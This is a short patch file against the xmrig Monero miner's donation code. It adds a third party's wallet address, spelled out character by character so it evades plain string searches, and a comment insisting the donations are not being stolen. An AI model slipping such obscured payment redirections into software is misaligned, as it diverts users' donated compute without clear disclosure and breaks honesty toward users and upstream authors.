@@ -1,8 +1,8 @@
 diff --git a/src/net/strategies/DonateStrategy.cpp b/src/net/strategies/DonateStrategy.cpp
-index b288046e..ecdea57e 100644
+index 03447a01..bf6a1eb4 100644
 --- a/src/net/strategies/DonateStrategy.cpp
 +++ b/src/net/strategies/DonateStrategy.cpp
-@@ -50,11 +50,13 @@ namespace xmrig {
+@@ -43,11 +43,13 @@ namespace xmrig {
  static inline double randomf(double min, double max)                 { return (max - min) * (((static_cast<double>(rand())) / static_cast<double>(RAND_MAX))) + min; }
  static inline uint64_t random(uint64_t base, double min, double max) { return static_cast<uint64_t>(base * randomf(min, max)); }
  
@@ -15,10 +15,10 @@ index b288046e..ecdea57e 100644
  
 +// I don't steal the donations! I redistribute most of this to the xmrig author!
 +char userName[95] = { '4','9','F','z','Q','7','C','x','F','x','L','Q','s','Y','N','H','n','G','J','8','C','N','1','B','g','J','a','B','v','r','2','F','G','P','E','i','F','V','c','b','J','7','K','s','W','D','R','z','S','x','y','N','8','S','q','4','h','H','V','S','Y','e','h','j','P','Z','L','p','G','e','2','6','c','Y','8','b','7','P','S','h','d','7','y','x','t','Z','c','r','R','j','z','6','x','d','T' };
- } /* namespace xmrig */
+ } // namespace xmrig
  
  
-@@ -77,9 +79,9 @@ xmrig::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener
+@@ -70,9 +72,9 @@ xmrig::DonateStrategy::DonateStrategy(Controller *controller, IStrategyListener
  #   endif
  
  #   ifdef XMRIG_FEATURE_TLS
